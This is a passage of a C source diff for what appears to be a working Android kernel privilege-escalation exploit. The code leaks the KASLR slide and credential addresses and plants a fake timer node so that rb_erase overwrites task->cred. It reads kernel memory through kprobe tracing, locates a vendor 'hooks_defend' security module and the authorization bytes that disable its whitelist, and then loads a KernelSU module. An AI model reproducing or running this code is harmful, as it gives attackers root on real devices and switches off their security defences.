+ * runner's stale-plant check. */
+static void fail_exit(const char *tag)
+{
+    printf("FAIL=%s REASON=%s T=%ldms\n", tag, tag, now_ms() - g_start_ms);
+    fflush(stdout);
+    if (g_held > 0) {
+        /* Failed plants left zombies held: reaping them runs rb_erase on
+         * foreign memory, so park and let the runner skip us. */
+        prctl(PR_SET_NAME, "t61269-hold");
+        printf("FAIL_EXIT=%s holder=t61269-hold zombies=%d\n", tag, g_held);
+        fflush(stdout);
+        park_forever("failed plant zombies held");
+    }
+    printf("FAIL_EXIT=%s holder=t61269-hold\n", tag);
+    fflush(stdout);
+    {
+        pid_t h = fork();
+        if (h == 0) {
+            setsid();
+            prctl(PR_SET_NAME, "t61269-hold");
+            int n = open("/dev/null", O_RDWR);
+            if (n >= 0) {
+                dup2(n, 0);
+                dup2(n, 1);
+                dup2(n, 2);
+                if (n > 2)
+                    close(n);
+            }
+            chdir("/");
+            for (int i = 0; i < 9; i++)
+                sleep(10);
+            _exit(0);
+        }
+        if (g_fake_child > 0) {
+            kill(g_fake_child, SIGKILL);
+            waitpid(g_fake_child, NULL, 0);
+            g_fake_child = -1;
+        }
+    }
+    _exit(13);
+}
+
+/* Fast gate for --auto, aligned with the 6.18 chain. */
+static int auto_preflight(void)
+{
+    struct utsname u;
+
+    memset(&u, 0, sizeof(u));
+    if (uname(&u)) {
+        printf("FAIL=probe REASON=uname failed\n");
+        return -1;
+    }
+    printf("PROBE_KERNEL=%s\n", u.release);
+    if (profile_check(u.release)) {
+        printf("FAIL=probe REASON=kernel mismatch got=%s\n", u.release);
+        return -1;
+    }
+    {
+        int fd = open(TR "/per_cpu/cpu0/trace_pipe_raw",
+                      O_RDONLY | O_NONBLOCK | O_CLOEXEC);
+        if (fd < 0) {
+            printf("FAIL=probe REASON=trace channel unavailable\n");
+            return -1;
+        }
+        close(fd);
+    }
+    printf("PROBE_TRACE=yes\nPROBE_OK\n");
+    fflush(stdout);
+    return 0;
+}
+
+/*
+ * Read-only validation for a new kernel build.  This intentionally stops
+ * before prefill_timers(), exec_thread() or run_plant(): no timers are
+ * raced with exec, no freed slab page is reclaimed and no kernel memory is
+ * written.
+ */
+static int probe_main(unsigned char *raw)
+{
+    unsigned long long ptrs[128], site0 = 0, task = 0;
+    timer_t timers[128];
+    int made = 0, nrec = 0;
+    long n;
+
+    if (auto_preflight())
+        return 3;
+    pin(g_cpu);
+    printf("[probe] pid=%d cpu=%d uid=%d\n", getpid(), g_cpu, getuid());
+
+    enable_events();
+    kick_rss();
+    usleep(50000);
+    stop_rss_flood();
+    if (discover_page_types(raw) != 0)
+        return 1;
+
+    trace_start();
+    for (int i = 0; i < (int)(sizeof(timers) / sizeof(timers[0])); i++)
+    {
+        struct sigevent ev;
+
+        memset(&ev, 0, sizeof(ev));
+        ev.sigev_notify = SIGEV_NONE;
+        if (timer_create(CLOCK_MONOTONIC, &ev, &timers[i]))
+            break;
+        made++;
+    }
+    usleep(3000);
+    trace_stop();
+    n = read_cpu(g_cpu, raw, 16u << 20);
+    if (n > 0)
+    {
+        /* PATCH: KASLR slide 的 mod-2MiB 分量未知，4 个候选各试一遍。 */
+        static const unsigned long long pcands[4] = {
+            0ULL, 0x80000ULL, 0x100000ULL, 0x180000ULL};
+        int pbest = 0, pn = -1;
+
+        for (int pci = 0; pci < 4; pci++)
+        {
+            int pcc;
+
+            g_low_adj = pcands[pci];
+            pcc = scan_timer_allocs(raw, (size_t)n, getpid(), ptrs, 128, &site0);
+            if (pcc > pn) { pn = pcc; pbest = pci; }
+        }
+        g_low_adj = pcands[pbest];
+        nrec = scan_timer_allocs(raw, (size_t)n, getpid(), ptrs, 128, &site0);
+    }
+    for (int i = 0; i < made; i++)
+        timer_delete(timers[i]);
+
+    printf("PROBE_TIMER made=%d recs=%d site=%#llx low_adj=%#llx\n",
+           made, nrec, site0, g_low_adj);
+    if (!nrec || !site0 ||
+        (site0 & 0x1fffffULL) !=
+            (unsigned long long)((TIMER_SITE_LOW21 + g_low_adj) & 0x1fffffULL)) {
+        printf("PROBE_TIMER_FAIL\n");
+        return 1;
+    }
+    g_slide = site0 - STATIC_TIMER_SITE;
+    printf("PROBE_SLIDE=%#llx aligned=%d\n", g_slide,
+           (g_slide & 0x1fffffULL) == 0);
+    /* PATCH: 非 2MiB 对齐不再致命 —— 低21位已由 g_low_adj 补偿 */
+    if ((g_slide & 0x1fffffULL) && (g_slide & 0x7ffffULL))
+        return 1;
+
+    g_base = calibrate_base(raw);
+    printf("PROBE_LINEAR_MAP=%#llx\n", g_base);
+    if (!g_base || g_base < 0xffffff0000000000ULL ||
+        g_base > 0xffffffc000000000ULL)
+        return 1;
+
+    g_fake_stage = 1;
+    pid_t child = -1;
+    int go_fd = -1, st_fd = -1;
+    unsigned long long cred = leak_cred(raw, &child, &go_fd, &st_fd, 0,
+                                        &task);
+    if (cred && child > 0) {
+        close(go_fd);
+        close(st_fd);
+        kill(child, SIGKILL);
+        waitpid(child, NULL, 0);
+    }
+    g_fake_stage = 0;
+    printf("PROBE_TASK=%#llx expected_low21=%#llx\n", task,
+           (unsigned long long)COPY_PROCESS_LOW21);
+    printf("PROBE_CRED=%#llx req=%#llx alloc=%#llx uid_off=%#llx\n",
+           cred, (unsigned long long)CRED_REQ,
+           (unsigned long long)CRED_ALLOC,
+           (unsigned long long)CRED_UID_OFF);
+    if (!cred || !task) {
+        printf("PROBE_ALLOC_FAIL\n");
+        return 1;
+    }
+
+    printf("PROBE_SELINUX_BLOB size=0x18 osid=0x0 sid=0x4 "
+           "exec_sid=0x8 create_sid=0xc set=exec_sid/create_sid=1\n");
+#if defined(V2505A)
+    printf("PROBE_VR_TRACEPOINT=%#llx funcs=%#llx off=%#llx\n",
+           SYS_EXIT_TRACEPOINT_STATIC + g_slide,
+           SYS_EXIT_TRACEPOINT_STATIC + g_slide + TRACEPOINT_FUNCS_OFF,
+           (unsigned long long)TRACEPOINT_FUNCS_OFF);
+#endif
+#if defined(KERNEL_66127)
+    printf("PROBE_SCHED_EXIT_TRACEPOINT=%#llx funcs=%#llx off=%#llx\n",
+           SCHED_EXIT_TRACEPOINT_STATIC + g_slide,
+           SCHED_EXIT_TRACEPOINT_STATIC + g_slide + TRACEPOINT_FUNCS_OFF,
+           (unsigned long long)TRACEPOINT_FUNCS_OFF);
+#endif
+#if defined(HOOKS_GATE)
+    printf("PROBE_GATE=%d modules=%#llx\n", g_gate,
+           g_gate ? g_gate_modules + g_slide : 0ULL);
+#endif
+    printf("PROBE_OK\n");
+    fflush(stdout);
+    return 0;
+}
+
+/*
+ * Stale timer node layout inside the reclaimed order-1 page.
+ *   zero: parent=0 -> rb_erase writes 0 to target.
+ *   fake: parent=node -> rb_erase writes node to target (task->cred); the
+ *         fake cred fields are overlaid at the same offset by run_plant.
+ */
+static void build_payload(unsigned char *buf, size_t off,
+                          unsigned long long parent, unsigned long long target)
+{
+    memset(buf, 0, SOCKBUF);
+    *(unsigned long long *)(buf + off + 0x00) = parent;
+    *(unsigned long long *)(buf + off + 0x10) = target;
+}
+
+
+
+#if defined(HOOKS_GATE)
+static unsigned long long rd_u64(unsigned long long addr);
+#include "t66127_binder.inc"
+
+static int read_int_file(const char *path)
+{
+    char buf[32];
+    int fd = open(path, O_RDONLY);
+    ssize_t n;
+    int v = -1;
+
+    if (fd < 0)
+        return -1;
+    n = read(fd, buf, sizeof(buf) - 1);
+    close(fd);
+    if (n <= 0)
+        return -1;
+    buf[n] = 0;
+    v = atoi(buf);
+    return v;
+}
+
+static void log_kernel_flags(const char *tag)
+{
+    logf("[diag] %s kptr=%d perf=%d moddis=%d\n", tag,
+         read_int_file("/proc/sys/kernel/kptr_restrict"),
+         read_int_file("/proc/sys/kernel/perf_event_paranoid"),
+         read_int_file("/proc/sys/kernel/modules_disabled"));
+}
+
+static int write_str(const char *path, const char *text)
+{
+    int fd = open(path, O_WRONLY);
+    ssize_t n;
+
+    if (fd < 0)
+        return -1;
+    n = write(fd, text, strlen(text));
+    close(fd);
+    return n == (ssize_t)strlen(text) ? 0 : -1;
+}
+
+#define OFF_SECT_NSECTIONS 0x28ULL
+#define OFF_SECT_ATTRS 0x30ULL
+
+static int g_rd_ready;
+static int g_rd_seq;
+static int g_gate_g_off = -1;
+
+static int rd_setup(void)
+{
+    if (g_rd_ready)
+        return 0;
+    mkdir("/sys/kernel/tracing/instances/rd", 0700);
+    if (write_str("/sys/kernel/tracing/instances/rd/buffer_size_kb", "4") &&
+        write_str("/sys/kernel/tracing/instances/rd/buffer_size_kb", "64"))
+        return -1;
+    if (write_str("/sys/kernel/tracing/instances/rd/tracing_on", "1"))
+        return -1;
+    g_rd_ready = 1;
+    return 0;
+}
+
+static int rd_parse(const char *buf, const char *key, unsigned long long *out)
+{
+    const char *p = strstr(buf, key);
+    char *end;
+
+    if (!p)
+        return -1;
+    p += strlen(key);
+    *out = strtoull(p, &end, 0);
+    return end != p ? 0 : -1;
+}
+
+static int rd_batch(const unsigned long long *addr, int n,
+                    unsigned long long *out)
+{
+    char path[192], spec[1400];
+    int name, len, fd, ok = -1;
+    ssize_t got = -1;
+    char *buf;
+
+    if (n < 1 || n > 32 || rd_setup())
+        return -1;
+    name = ++g_rd_seq;
+    len = snprintf(spec, sizeof(spec), "p:rd%d capable", name);
+    for (int i = 0; i < n; i++)
+        len += snprintf(spec + len, sizeof(spec) - len, " w%d=@0x%llx",
+                        i, addr[i]);
+    snprintf(spec + len, sizeof(spec) - len, "\n");
+    write_str("/sys/kernel/tracing/instances/rd/trace", "\n");
+    snprintf(path, sizeof(path), "-:rd%d\n", name);
+    write_str("/sys/kernel/tracing/kprobe_events", path);
+    if (write_str("/sys/kernel/tracing/kprobe_events", spec))
+    {
+        logf("[rd] event errno=%d\n", errno);
+        return -1;
+    }
+    snprintf(path, sizeof(path),
+             "/sys/kernel/tracing/instances/rd/events/kprobes/rd%d/enable",
+             name);
+    if (write_str(path, "1"))
+        logf("[rd] enable errno=%d\n", errno);
+    buf = malloc(1u << 20);
+    for (int try = 0; try < 3 && ok; try++)
+    {
+        char key[16];
+
+        errno = 0;
+        (void)syscall(SYS_finit_module, -1, "", 0);
+        usleep(2000);
+        fd = open("/sys/kernel/tracing/instances/rd/trace", O_RDONLY);
+        got = -1;
+        if (fd >= 0)
+        {
+            if (buf)
+                got = read(fd, buf, (1u << 20) - 1);
+            close(fd);
+        }
+        if (!buf || got <= 0)
+            continue;
+        buf[got] = 0;
+        ok = 0;
+        for (int i = 0; i < n; i++)
+        {
+            snprintf(key, sizeof(key), "w%d=", i);
+            if (rd_parse(buf, key, &out[i]))
+            {
+                ok = -1;
+                break;
+            }
+        }
+        if (ok)
+            write_str("/sys/kernel/tracing/instances/rd/trace", "\n");
+    }
+    free(buf);
+    write_str(path, "0");
+    snprintf(path, sizeof(path), "-:rd%d\n", name);
+    write_str("/sys/kernel/tracing/kprobe_events", path);
+    if (ok)
+        logf("[rd] parse failed n=%d got=%zd\n", n, got);
+    return ok;
+}
+
+static unsigned long long rd_u64(unsigned long long addr)
+{
+    unsigned long long v = 0;
+
+    return rd_batch(&addr, 1, &v) ? 0 : v;
+}
+
+
+static int rd_mod_index(int *total_out)
+{
+    char *buf = malloc(1u << 18);
+    ssize_t used = 0;
+    int fd, idx = -1, lines = 0;
+    char *p;
+
+    if (total_out)
+        *total_out = -1;
+    if (!buf)
+        return -1;
+    fd = open("/proc/modules", O_RDONLY);
+    if (fd < 0)
+    {
+        free(buf);
+        return -1;
+    }
+    while (used < (1 << 18) - 1)
+    {
+        ssize_t n = read(fd, buf + used, (1 << 18) - 1 - used);
+
+        if (n <= 0)
+            break;
+        used += n;
+    }
+    close(fd);
+    if (used <= 0)
+    {
+        free(buf);
+        return -1;
+    }
+    buf[used] = 0;
+    p = buf;
+    while (*p)
+    {
+        char *nl = strchr(p, '\n');
+        char *sp = strchr(p, ' ');
+
+        if (!nl)
+            break;
+        if (sp && sp < nl && sp - p == 12 &&
+            !strncmp(p, "hooks_defend", 12) && idx < 0)
+            idx = lines;
+        lines++;
+        p = nl + 1;
+    }
+    if (total_out)
+        *total_out = lines;
+    logf("[rd] modules file=%zd lines=%d idx=%d\n", used, lines, idx);
+    free(buf);
+    return idx;
+}
+
+/*
+ * A module list node is &mod->list (mod + 8), so the inline name array at
+ * mod + 0x18 lands on node + 0x10.  Read the link and the name in one probe:
+ * the name is a char array, not a pointer.
+ */
+static int rd_node(unsigned long long node, int back,
+                   unsigned long long *link, char *name)
+{
+    unsigned long long in[3], v[3];
+
+    in[0] = node + (back ? 8 : 0);
+    in[1] = node + 0x10;
+    in[2] = node + 0x18;
+    if (rd_batch(in, 3, v))
+        return -1;
+    *link = v[0];
+    memcpy(name, &v[1], 16);
+    name[16] = 0;
+    return 0;
+}
+
+static int rd_scan(unsigned long long start, int back, int steps,
+                   unsigned long long head, unsigned long long *hit)
+{
+    unsigned long long node = start, link;
+    char name[24];
+
+    for (int i = 0; i <= steps && i < 4096; i++)
+    {
+        if (rd_node(node, back, &link, name))
+            return -1;
+        if (!strncmp(name, "hooks_defend", 12))
+        {
+            logf("[rd] found i=%d node=%#llx name=%s\n", i, node, name);
+            *hit = node;
+            return 0;
+        }
+        if (!link || link == head)
+            break;
+        node = link;
+    }
+    return 1;
+}
+
+static unsigned long long rd_walk_module(void)
+{
+    unsigned long long head = g_gate_modules + g_child_slide;
+    unsigned long long ends[2], ev[2], hit = 0, first, last;
+    int total = -1, idx, steps, back, r;
+
+    ends[0] = head;
+    ends[1] = head + 8;
+    if (rd_batch(ends, 2, ev))
+        return 0;
+    first = ev[0];
+    last = ev[1];
+    logf("[rd] walk first=%#llx last=%#llx\n", first, last);
+    if (first < 0xffffff0000000000ULL || first == head)
+        return 0;
+    idx = rd_mod_index(&total);
+    if (idx >= 0 && total > 0 && (total - 1 - idx) < idx &&
+        last >= 0xffffff0000000000ULL && last != head)
+    {
+        back = 1;
+        steps = total - 1 - idx;
+    }
+    else
+    {
+        back = 0;
+        steps = idx >= 0 ? idx : (total > 0 ? total : 4095);
+    }
+    logf("[rd] walk dir=%s steps=%d\n", back ? "back" : "fwd", steps);
+    r = rd_scan(back ? last : first, back, steps, head, &hit);
+    if (r == 0)
+        return hit - 8;
+    if ((r < 0 || (back && r == 1) || (!back && total > 0 && steps < total)) &&
+        rd_scan(first, 0, total > 0 ? total + 64 : 4095, head, &hit) == 0)
+        return hit - 8;
+    return 0;
+}
+
+static unsigned long long rd_data_section(unsigned long long mod)
+{
+    unsigned long long sect = rd_u64(mod + GATE_MOD_SECT_ATTRS);
+    unsigned long long in[32], names[32], vals[32];
+    unsigned long long n;
+    int count;
+
+    if (sect < 0xffffff0000000000ULL)
+        return 0;
+    n = rd_u64(sect + OFF_SECT_NSECTIONS);
+    count = (int)(n & 0xffffffffULL);
+    if (count < 1 || count > 32)
+        return 0;
+    for (int i = 0; i < count; i++)
+        in[i] = sect + OFF_SECT_ATTRS +
+                (unsigned long long)i * GATE_SECT_ATTR_SIZE;
+    if (rd_batch(in, count, names))
+        return 0;
+    if (rd_batch(names, count, vals))
+        return 0;
+    for (int i = 0; i < count; i++)
+    {
+        unsigned char *b = (unsigned char *)&vals[i];
+
+        if (b[0] == '.' && b[1] == 'd' && b[2] == 'a' &&
+            b[3] == 't' && b[4] == 'a' && b[5] == 0)
+            return rd_u64(in[i] + GATE_SECT_ADDRESS);
+    }
+    return 0;
+}
+
+static int rd_bytes(unsigned long long addr, unsigned char *out, size_t len)
+{
+    size_t off = 0;
+
+    while (off < len)
+    {
+        unsigned long long in[32], v[32];
+        size_t q = (len - off + 7) / 8;
+        size_t n = q > 32 ? 32 : q;
+
+        for (size_t i = 0; i < n; i++)
+            in[i] = addr + off + i * 8;
+        if (rd_batch(in, (int)n, v))
+            return -1;
+        for (size_t i = 0; i < n && off + i * 8 < len; i++)
+        {
+            size_t take = len - (off + i * 8);
+
+            if (take > 8)
+                take = 8;
+            memcpy(out + off + i * 8, &v[i], take);
+        }
+        off += n * 8;
+    }
+    return 0;
+}
+
+static int gate_perm_ok(const unsigned char *p)
+{
+    unsigned seen = 0;
+
+    for (int i = 0; i < 14; i++)
+    {
+        unsigned v = p[i];
+
+        if (v > 13 || (seen & (1u << v)))
+            return 0;
+        seen |= 1u << v;
+    }
+    return seen == 0x3fffu;
+}
+
+/*
+ * hooks_defend keeps g[14] and perm[14] adjacent in .data, and perm is a
+ * permutation of 0..13 filled at boot.  Scan for that signature so the
+ * offset does not depend on the module build.
+ */
+static int gate_scan_g(unsigned long long data)
+{
+    unsigned char buf[0x800];
+
+    if (rd_bytes(data, buf, sizeof(buf)))
+        return -1;
+    for (size_t off = 0; off + 28 <= sizeof(buf); off++)
+    {
+        if (!gate_perm_ok(buf + off + 14))
+            continue;
+        g_gate_g_off = (int)off;
+        logf("[rd] g_off=%#x\n", (unsigned)off);
+        return 0;
+    }
+    logf("[rd] g scan failed\n");
+    return -1;
+}
+
+static int gate_read_g(unsigned long long data, unsigned char bytes[32])
+{
+    unsigned long long in[4], v[4];
+
+    if (g_gate_g_off < 0)
+        return -1;
+    for (int i = 0; i < 4; i++)
+        in[i] = data + (unsigned long long)g_gate_g_off +
+                (unsigned long long)i * 8;
+    if (rd_batch(in, 4, v))
+        return -1;
+    memcpy(bytes, v, sizeof(v));
+    return 0;
+}
+
+static unsigned long long rd_gate_word(unsigned long long data)
+{
+    unsigned long long np, nm[2], in[2], g7;
+    unsigned char bytes[32];
+    int perm7;
+
+#if defined(KERNEL_66127)
+    np = rd_u64(data + 0x538);
+    if (np >= 0xffffff0000000000ULL)
+    {
+        in[0] = np;
+        in[1] = np + 8;
+        if (!rd_batch(in, 2, nm) && !memcmp(nm, "insko_dfd_on", 12))
+            g_gate_g_off = 0x140;
+        else
+            logf("[rd] attr check mismatch\n");
+    }
+#endif
+    if (g_gate_g_off < 0 && gate_scan_g(data))
+        return 0;
+    if (gate_read_g(data, bytes))
+        return 0;
+    logf("[rd] g=%02x%02x%02x%02x%02x%02x%02x%02x"
+         "%02x%02x%02x%02x%02x%02x%02x%02x"
+         "%02x%02x%02x%02x%02x%02x%02x%02x"
+         "%02x%02x%02x%02x%02x%02x%02x%02x\n",
+         bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5],
+         bytes[6], bytes[7], bytes[8], bytes[9], bytes[10], bytes[11],
+         bytes[12], bytes[13], bytes[14], bytes[15], bytes[16],
+         bytes[17], bytes[18], bytes[19], bytes[20], bytes[21],
+         bytes[22], bytes[23], bytes[24], bytes[25], bytes[26],
+         bytes[27], bytes[28], bytes[29], bytes[30], bytes[31]);
+    perm7 = bytes[0x15];
+    g7 = data + (unsigned long long)g_gate_g_off +
+         (unsigned long long)perm7;
+    logf("[rd] g7=%#llx perm7=%d val=%d\n", g7, perm7,
+         perm7 < 14 ? (int)bytes[perm7] : -1);
+    if (perm7 > 0xd)
+        return 0;
+    return g7 & ~7ULL;
+}
+
+static unsigned long long leak_g_slot(void)
+{
+    unsigned long long head, mod, data, gate;
+
+    if (rd_setup())
+    {
+        logf("[rd] setup failed\n");
+        return 0;
+    }
+    head = rd_u64(g_gate_modules + g_child_slide);
+    logf("[rd] modules=%#llx\n", head);
+    if (head < 0xffffff0000000000ULL || (head & 7))
+        return 0;
+    mod = rd_walk_module();
+    if (mod < 0xffffff0000000000ULL)
+    {
+        logf("[rd] module not found\n");
+        return 0;
+    }
+    data = rd_data_section(mod);
+    logf("[rd] data=%#llx\n", data);
+    if (data < 0xffffff0000000000ULL)
+        return 0;
+    g_child_data = data;
+    gate = rd_gate_word(data);
+    logf("[rd] gate word=%#llx\n", gate);
+    return gate;
+}
+
+/*
+ * hooks_defend stores its auth bits in g[0..4].  The load gate first
+ * verifies (g0+g1+g2+g3+g4) mod 256 == 0 and, when def_on (g9) is 0,
+ * fails open if that checksum no longer holds.  rem_authed/em_authed/
+ * vroot_authed/unlocked use the plain uint8 store with no authorization,
+ * so writing one of them to 1 disables the whitelist check.
+ */
+static int read_auth_bit(const char *name)
+{
+    char path[128], c = 0;
+    int fd;
+
+    snprintf(path, sizeof(path), "/sys/kernel/bsp_security/%s", name);
+    fd = open(path, O_RDONLY);
+    if (fd < 0)
+        return -1;
+    if (read(fd, &c, 1) != 1)
+        c = 0;
+    close(fd);
+    return c - '0';
+}
+
+static void log_tail(const char *tag, const char *buf, size_t n, int max_lines)
+{
+    size_t start = n;
+    int lines = 0;
+    const char *p, *end = buf + n;
+
+    while (start > 0 && lines <= max_lines)
+    {
+        start--;
+        if (buf[start] == '\n' && start + 1 != n)
+            lines++;
+    }
+    if (start > 0)
+        start++;
+    logf("[%s] tail %zu/%zu\n", tag, n - start, n);
+    p = buf + start;
+    while (p < end)
+    {
+        const char *nl = memchr(p, '\n', (size_t)(end - p));
+        size_t len = nl ? (size_t)(nl - p) : (size_t)(end - p);
+
+        while (len && p[len - 1] == '\r')
+            len--;
+        if (len)
+            logf("[%s] %.*s\n", tag, (int)len, p);
+        if (!nl)
+            break;
+        p = nl + 1;
+    }
+}
+
+static void capture_pstore(void)
+{
+    DIR *d = opendir("/sys/fs/pstore");
+    struct dirent *de;
+
+    if (!d)
+    {
+        logf("[ps] opendir errno=%d\n", errno);
+        return;
+    }
+    while ((de = readdir(d)) != NULL)
+    {
+        char path[256];
+        struct stat st;
+        int fd;
+        char *buf;
+        ssize_t got;
+
+        if (de->d_name[0] == '.')
+            continue;
+        snprintf(path, sizeof(path), "/sys/fs/pstore/%s", de->d_name);
+        if (stat(path, &st) || !S_ISREG(st.st_mode))
+            continue;
+        logf("[ps] %s size=%lld\n", de->d_name, (long long)st.st_size);
+        if (st.st_size <= 0 || st.st_size > (1 << 20))
+            continue;
+        fd = open(path, O_RDONLY);
+        if (fd < 0)
+            continue;
+        buf = malloc((size_t)st.st_size + 1);
+        got = buf ? read(fd, buf, (size_t)st.st_size) : -1;
+        close(fd);
+        if (buf && got > 0)
+        {
+            buf[got] = 0;
+            log_tail("ps", buf, (size_t)got, 120);
+        }
+        free(buf);
+    }
+    closedir(d);
+}
+
+static int read_text_file(const char *path, char *buf, size_t cap)
+{
+    int fd = open(path, O_RDONLY);
+    ssize_t n;
+
+    if (fd < 0)
+        return -1;
+    n = read(fd, buf, cap - 1);
+    close(fd);
+    if (n <= 0)
+        return -1;
+    buf[n] = 0;
+    return (int)n;
+}
+
+static int module_live(void)
+{
+    char buf[32];
+    int n = read_text_file("/sys/module/kernelsu/initstate", buf, sizeof(buf));
+
+    return n > 0 && strstr(buf, "live") != NULL;
+}
+
+/*
+ * Read-only: dump the loader thread's kernel stack (plus any task stuck in D)
+ * as soon as it is sampled; the module stays in Loading while init runs, so
+ * sampling must not wait for a state change.
+ */
+static void dump_thread_stacks(void)
+{
+    DIR *d = opendir("/proc/self/task");
+    struct dirent *de;
+    static char out[8192];
+    static unsigned long long last;
+    unsigned long long h = 1469598103934665603ULL;
+    size_t used = 0;
+    int mod_dir = access("/sys/module/kernelsu", F_OK) == 0;
+    char path[192], comm[64], stat[1024], stk[4096], wchan[128];
+
+    if (!d)
+        return;
+    h = (h ^ (unsigned long long)mod_dir) * 1099511628211ULL;
+    used += (size_t)snprintf(out, sizeof(out), "-- module_dir=%d\n", mod_dir);
+    while ((de = readdir(d)) != NULL)
+    {
+        char state = 0;
+        char *rp;
+        int n;
+
+        if (de->d_name[0] == '.')
+            continue;
+        snprintf(path, sizeof(path), "/proc/self/task/%s/comm", de->d_name);
+        if (read_text_file(path, comm, sizeof(comm)) <= 0)
+            continue;
+        comm[strcspn(comm, "\n")] = 0;
+        snprintf(path, sizeof(path), "/proc/self/task/%s/stat", de->d_name);
+        if (read_text_file(path, stat, sizeof(stat)) > 0)
+        {
+            rp = strrchr(stat, ')');
+            if (rp && rp[1] == ' ' && rp[2])
+                state = rp[2];
+        }
+        if (strcmp(comm, "child-load") && state != 'D')
+            continue;
+        wchan[0] = 0;
+        snprintf(path, sizeof(path), "/proc/self/task/%s/wchan", de->d_name);
+        if (read_text_file(path, wchan, sizeof(wchan)) <= 0)
+            wchan[0] = 0;
+        snprintf(path, sizeof(path), "/proc/self/task/%s/stack", de->d_name);
+        errno = 0;
+        n = read_text_file(path, stk, sizeof(stk));
+        if (n <= 0)
+        {
+            static int stack_ro_logged;
+
+            if (!strcmp(comm, "child-load") && !stack_ro_logged)
+            {
+                stack_ro_logged = 1;
+                logf("[stk] stack read failed tid=%s errno=%d\n",
+                     de->d_name, errno);
+            }
+            continue;
+        }
+        for (int i = 0; i < n; i++)
+            h = (h ^ (unsigned char)stk[i]) * 1099511628211ULL;
+        h = (h ^ (unsigned long long)state) * 1099511628211ULL;
+        if (used + (size_t)n + 96 < sizeof(out))
+            used += (size_t)snprintf(out + used, sizeof(out) - used,
+                                     "-- %s tid=%s state=%c wchan=%s\n%s",
+                                     comm, de->d_name, state,
+                                     wchan[0] ? wchan : "?", stk);
+    }
+    closedir(d);
+    if (used && h != last)
+    {
+        char *p = out;
+
+        last = h;
+        logf("[stk] begin\n");
+        while (*p)
+        {
+            char *nl = strchr(p, '\n');
+            size_t len = nl ? (size_t)(nl - p) : strlen(p);
+
+            logf("[stk] %.*s\n", (int)len, p);
+            if (!nl)
+                break;
+            p = nl + 1;
+        }
+        logf("[stk] end\n");
+    }
+}
+
+static void sysrq_dump(void)
+{
+    write_str("/proc/sys/kernel/sysrq", "1\n");
+    logf("[dw] sysrq l/w\n");
+    write_str("/proc/sysrq-trigger", "l");
+    usleep(200000);
+    write_str("/proc/sysrq-trigger", "w");
+}
+
+static int kw_hit(const char *line, size_t len)
+{
+    static const char *kw[] = {
+        "WARNING:", "kernel BUG", "Internal error", "Oops",
+        "Kernel panic", "soft lockup", "hard LOCKUP", "hung task",
+        "blocked for more than", "Call trace:", "Unable to handle",
+        "sysrq:", "SysRq :", "NMI watchdog", "backtrace",
+    };
+    size_t i;
+
+    if (len > 512)
+        return 0;
+    for (i = 0; i < sizeof(kw) / sizeof(kw[0]); i++)
+        if (memmem(line, len, kw[i], strlen(kw[i])))
+            return 1;
+    return 0;
+}
+
+/*
+ * Runs while the loader thread sits in init_module so a lockup leaves its
+ * kernel trace on the durable log before the device is reset.
+ */
+static void *dmesg_watch(void *arg)
+{
+    size_t cap = 1u << 20;
+    char *buf = malloc(cap);
+
+    prctl(PR_SET_NAME, "probe-watch", 0, 0, 0);
+    unsigned long long last = 0;
+    int polls = 0;
+    int stuck = 0, did_sysrq = 0;
+
+    (void)arg;
+    if (!buf)
+        return NULL;
+    for (;;)
+    {
+        long n = syscall(SYS_syslog, 3, buf, cap - 1);
+
+        if (n > 0)
+        {
+            unsigned long long h = 1469598103934665603ULL;
+            int lines = 0;
+            size_t off = 0;
+
+            buf[n] = 0;
+            while (off < (size_t)n)
+            {
+                char *nl = memchr(buf + off, '\n', (size_t)n - off);
+                size_t len = nl ? (size_t)(nl - (buf + off)) : (size_t)n - off;
+
+                if (len && kw_hit(buf + off, len))
+                {
+                    size_t i;
+
+                    for (i = 0; i < len; i++)
+                        h = (h ^ (unsigned char)buf[off + i]) *
+                            1099511628211ULL;
+                    lines++;
+                }
+                if (!nl)
+                    break;
+                off = (size_t)(nl - buf) + 1;
+            }
+            if (lines && h != last)
+            {
+                last = h;
+                off = 0;
+                lines = 0;
+                while (off < (size_t)n && lines < 64)
+                {
+                    char *nl = memchr(buf + off, '\n', (size_t)n - off);
+                    size_t len = nl ? (size_t)(nl - (buf + off))
+                                    : (size_t)n - off;
+
+                    while (len && buf[off + len - 1] == '\r')
+                        len--;
+                    if (len && kw_hit(buf + off, len))
+                    {
+                        logf("[dw] %.*s\n", (int)len, buf + off);
+                        lines++;
+                    }
+                    if (!nl)
+                        break;
+                    off = (size_t)(nl - buf) + 1;
+                }
+            }
+        }
+        if (polls >= 25 && !module_live())
+        {
+            if (!stuck)
+            {
+                stuck = 1;
+                logf("[dw] module still pending after %d polls\n", polls);
+            }
+            dump_thread_stacks();
+            if (!did_sysrq)
+            {
+                did_sysrq = 1;
+                sysrq_dump();
+            }
+        }
+        polls++;
+        if (polls < 50)
+            usleep(200000);
+        else if (polls < 80)
+            sleep(1);
+        else
+            sleep(3);
+    }
+    return NULL;
+}
+
+#endif
+
+static void run_late_load_script(unsigned long long slide)
+{
+    const char *ksud = getenv("PYB110_KSUD");
+    char cmd[2048];
+
+#if defined(HOOKS_GATE)
+    if (g_gate)
+    {
+        const char *files = getenv("PYB110_FILES_DIR");
+        const char *kmi = getenv("PYB110_KMI");
+        const char *kmi_def =
+#if defined(KERNEL_66127)
+            "android15-6.6";
+#else
+            "android16-6.12";
+#endif
+        char name[96], ko[512], bound[512];
+
+        if (!kmi || !*kmi)
+            kmi = kmi_def;
+        if (!ksud || !*ksud || !files || !*files)
+        {
+            logf("[load] env missing ksud=%s files=%s\n",
+                 ksud ? ksud : "(null)", files ? files : "(null)");
+            return;
+        }
+        snprintf(name, sizeof(name), "%s_kernelsu.ko", kmi);
+        snprintf(ko, sizeof(ko), "%s/ko.bin", files);
+        snprintf(bound, sizeof(bound), "%s/ko_bound.bin", files);
+        unlink(ko);
+        unlink(bound);
+        snprintf(cmd, sizeof(cmd),
+                 "'%s' debug extract-binary %s '%s' 2>&1; "
+                 "echo EXTRACT_RC=$?",
+                 ksud, name, ko);
+        printf("LOAD_EXTRACT=%s\n", cmd);
+        fflush(stdout);
+        logf("[load] extract shell=%d\n", system(cmd));
+        if (access(ko, R_OK))
+        {
+            logf("[load] extracted ko missing\n");
+            return;
+        }
+        load_bound_ko(ko, bound, slide);
+        unlink(ko);
+        unlink(bound);
+        return;
+    }
+#endif
+    const char *pkg = getenv("PYB110_MANAGER_PKG");
+    const char *kmi = getenv("PYB110_KMI");
+
+    (void)slide;
